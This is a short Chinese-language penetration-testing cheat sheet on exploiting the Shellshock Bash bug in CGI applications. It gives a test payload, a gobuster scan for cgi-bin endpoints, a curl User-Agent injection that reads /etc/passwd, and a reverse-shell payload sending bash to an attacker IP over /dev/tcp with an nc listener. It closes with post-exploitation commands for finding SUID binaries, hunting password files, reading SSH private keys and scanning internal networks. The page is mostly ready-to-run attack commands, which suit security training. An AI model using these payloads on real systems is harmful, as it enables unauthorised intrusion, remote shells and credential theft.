# 攻擊通用網關介面 (CGI) 應用程式 - Shellshock

## <mark style="color:red;">**1. 發現點**</mark>

* Shellshock 係因為 Bash 對環境變數處理方式出錯
* 本應函數定義儲存到變數，但 Bash 執行錯誤地允許「函數後面嘅指令」被當成系統命令執行
* 適用於舊版 Bash（很多 Linux 主機在 CGI 程式執行時都會用到 Bash）

## <mark style="color:red;">**2. 測試Payload**</mark>

```
env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
```

* 如果系統有漏洞，會輸出：

```
vulnerable-shellshock
not vulnerable
```

* 否則只會印出 `not vulnerable`

## <mark style="color:red;">3. 掃描路徑</mark>

* 使用 Gobuster、dirb、ffuf 等工具找 CGI endpoint：

```bash
gobuster dir -u http://<target>/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```

* 找到如 `/cgi-bin/access.cgi`

## <mark style="color:red;">4. 確認漏洞</mark>

* 用 curl 嘗試注入指令：

```bash
curl -H 'User-Agent: () { :; }; echo; /bin/cat /etc/passwd' http://<target>/cgi-bin/access.cgi
```

* 如果回傳 `/etc/passwd` 的內容，即確認漏洞存在

## <mark style="color:red;">5. 利用取得反向 shell</mark>

* 開啟 listener：

```bash
nc -lvnp 7777
```

* 發送 payload：

```bash
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/你的IP/7777 0>&1' http://<target>/cgi-bin/access.cgi
```

* 成功後獲得 `www-data` 權限 shell



## <mark style="color:red;">5. 連鎖漏洞</mark>

當拿到 `www-data` 權限後，可以進行以下鏈式利用（pivot）：

| 步驟               | 攻擊目標                                     | 工具/命令範例                                            |
| ---------------- | ---------------------------------------- | -------------------------------------------------- |
| **本地提權**         | 找可利用的 sudo 權限、SUID Binary、Kernel Exploit | `sudo -l`、`find / -perm -4000 -type f 2>/dev/null` |
| **檔案搜尋敏感資訊**     | 找密碼、Token、私鑰                             | `find / -type f -iname "*password*" 2>/dev/null`   |
| **橫向移動**         | 如果有多個用戶或內網目標，嘗試 SSH、RDP、Telnet           | `cat ~/.ssh/id_rsa`、`ssh user@ip`                  |
| **讀 crontab**    | 檢查是否有定時執行惡意可利用的腳本                        | `cat /etc/crontab`                                 |
| **檢查 NFS / SMB** | 有沒有掛載 NFS、開啟 SMB 可導致任意檔案存取               | `showmount -e <ip>`、`smbclient -L //<ip>`          |
| **內網掃描**         | 利用目標主機繼續向內部網段滲透                          | 使用 `nmap`、`ping`                                   |
